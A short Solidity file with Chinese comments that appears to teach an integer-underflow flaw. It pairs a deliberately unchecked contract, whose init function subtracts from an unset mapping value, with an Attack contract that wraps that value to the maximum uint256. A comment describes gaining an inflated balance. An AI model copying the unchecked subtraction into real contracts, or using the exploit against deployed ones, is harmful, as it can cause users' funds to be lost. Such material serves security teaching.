// 攻擊合約 - Integer Underflow 漏洞示範
contract Attack {
    IntegerOverflowMappingSym1 public vulnerableContract;
    
    constructor(address _vulnerable) {
        vulnerableContract = IntegerOverflowMappingSym1(_vulnerable);
    }
    
    // 攻擊函式：利用整數下溢
    function exploit(uint256 key) public {
        // 由於 mapping 中未初始化的值預設為 0，當我們嘗試從中減去任何正數時會發生下溢
        // 下溢後，map[key] 將會變成一個非常大的數字 (2^256 - v)
        vulnerableContract.init(key, 1);
        
        // 此時 map[key] 將從 0 變成 (2^256 - 1)，造成嚴重的邏輯錯誤
        // 攻擊者可以利用此邏輯漏洞獲取不該有的資源或繞過限制
    }
}

// 漏洞合約參考
contract IntegerOverflowMappingSym1 {
    mapping(uint256 => uint256) map;
    function init(uint256 k, uint256 v) public {
        map[k] -= v;
    }
}

/* 
攻擊解釋：
- 當對 mapping 未初始化的元素（預設值為 0）進行減法操作時，會觸發整數下溢
- 在此攻擊中，我們對 key 位置的值（預設為 0）減去 1，結果為 2^256 - 1（最大的 uint256 值）
- 這會導致邏輯錯誤，例如如果該 mapping 用於記錄用戶餘額，攻擊者可能會獲得非常大的餘額
- 在金融相關合約中，此漏洞尤其危險，可能導致資金損失
*/